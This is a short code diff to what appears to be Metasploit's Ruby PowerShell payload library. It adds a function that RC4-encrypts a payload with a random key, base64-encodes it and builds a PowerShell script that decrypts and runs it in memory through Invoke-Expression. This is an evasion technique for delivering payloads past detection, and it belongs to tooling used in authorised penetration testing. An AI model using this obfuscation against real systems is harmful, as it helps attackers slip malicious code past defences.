@@ -1,5 +1,6 @@
 # -*- coding: binary -*-
 require 'rex/random_identifier'
+require 'rc4'
 
 module Rex
 module Powershell
@@ -104,6 +105,27 @@ module Payload
     hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)
 
     read_replace_script_template(template_path, "to_mem_msil.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
+  end
+
+  #
+  # PSH script that executes an RC4 encrypted payload with Invoke-Expression
+  # by Adrian Vollmer (SySS GmbH, https://www.syss.de)
+  #
+  def self.to_win32pe_psh_rc4(template_path = TEMPLATE_DIR, code)
+    rig = Rex::RandomIdentifier::Generator.new(DEFAULT_RIG_OPTS)
+    rig.init_var(:func_rc4_decrypt)
+    rig.init_var(:var_rc4buffer)
+    rig.init_var(:var_key)
+
+    key = Rex::Text.rand_text_alpha(rand(8)+8)
+    rc4 = RC4.new(key)
+    enc_code = rc4.encrypt(code)
+
+    hash_sub = rig.to_h
+    hash_sub[:random_key] = key
+    hash_sub[:b64payload] = Rex::Text.encode_base64(enc_code)
+
+    read_replace_script_template(template_path, "to_mem_rc4.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
   end
 
 end
